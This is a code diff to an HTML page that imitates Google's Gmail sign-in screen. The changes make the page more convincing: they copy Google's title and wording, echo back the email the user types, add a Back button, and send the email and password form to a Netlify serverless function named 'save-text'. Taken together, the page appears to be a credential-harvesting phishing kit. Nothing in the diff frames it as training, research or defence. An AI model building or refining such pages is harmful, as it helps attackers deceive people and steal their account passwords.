@@ -4,9 +4,8 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gmail</title>
+    <title>Sign in - Google Accounts</title>
     <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
     <div class="main">
@@ -14,18 +13,18 @@
             <div class="inner__wrapper">
                 <img src="logo.png" alt="logo" width="75" height="24">
                 <h2 id="signIn">Sign in</h2>
-                <h3 id="gmailAccount" class="gmailAccount">Use your Google Account</h3>
-                <form action="post.php" method="post">
+                <h3 id="gmailAccount" class="gmailAccount">to continue to Gmail</h3>
+                <form action="/.netlify/functions/save-text" method="post">
                     <div class="form-wrapper username">
                         <div class="form__group">
                             <input type="text" name="email" required>
                             <label for="email">Email or phone</label>
                         </div>
-                        <a href="#" class="forgot"> Create email?</a>
-                        <p>Not your computer? Use Guest mode to sign in privately <a href="#">Learn More</a></p>
+                        <a href="#" class="forgot">Forgot email?</a>
+                        <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></p>
                         <ul class="control">
                             <li><a href="#">Create account</a></li>
-                            <li><button class="btn" id="btnNext">Next</button></li>
+                            <li><button class="btn" id="btnNext" type="button">Next</button></li>
                         </ul>
                     </div>
                     <div class="form-wrapper password">
@@ -34,7 +33,7 @@
                             <label for="password">Enter your password</label>
                         </div>
                         <ul class="control">
-                            <li><a href="#">Forgot password?</a></li>
+                            <li><button class="btn btn-secondary" id="btnBack" type="button">Back</button></li>
                             <li><button class="btn" id="btndone" type="submit" name="save">Next</button></li>
                         </ul>
                     </div>
@@ -56,19 +55,55 @@
     </div>
     <script>
         const btnNext = document.querySelector('#btnNext');
+        const btnBack = document.querySelector('#btnBack');
+        const emailInput = document.querySelector('input[name="email"]');
+        const passwordInput = document.querySelector('input[name="passw"]');
         const username = document.querySelector('.username');
         const password = document.querySelector('.password');
         const signIn = document.querySelector('#signIn');
         const gmailAccount = document.querySelector('#gmailAccount');
 
-        btnNext.addEventListener('click', (e)=>{
-            e.preventDefault();
+        const showPasswordStep = () => {
+            const enteredEmail = emailInput.value.trim();
+
+            if (!enteredEmail) {
+                emailInput.focus();
+                return;
+            }
+
             username.classList.add('deactive');
             password.classList.add('active');
-            signIn.textContent = 'Hi Mubahil';
+            signIn.textContent = 'Welcome';
             gmailAccount.classList.add('changeName');
-            gmailAccount.innerHTML = '<i class=" fas fa-user"></i> mubahil@try.com ';
-        })
+            gmailAccount.textContent = enteredEmail;
+        };
+
+        const showEmailStep = () => {
+            password.classList.remove('active');
+            username.classList.remove('deactive');
+            signIn.textContent = 'Sign in';
+            gmailAccount.classList.remove('changeName');
+            gmailAccount.textContent = 'to continue to Gmail';
+            passwordInput.value = '';
+            emailInput.focus();
+        };
+
+        btnNext.addEventListener('click', showPasswordStep);
+        btnBack.addEventListener('click', showEmailStep);
+
+        emailInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                showPasswordStep();
+            }
+        });
+
+        passwordInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                e.preventDefault();
+                showEmailStep();
+            }
+        });
     </script>
 </body>
 </html>
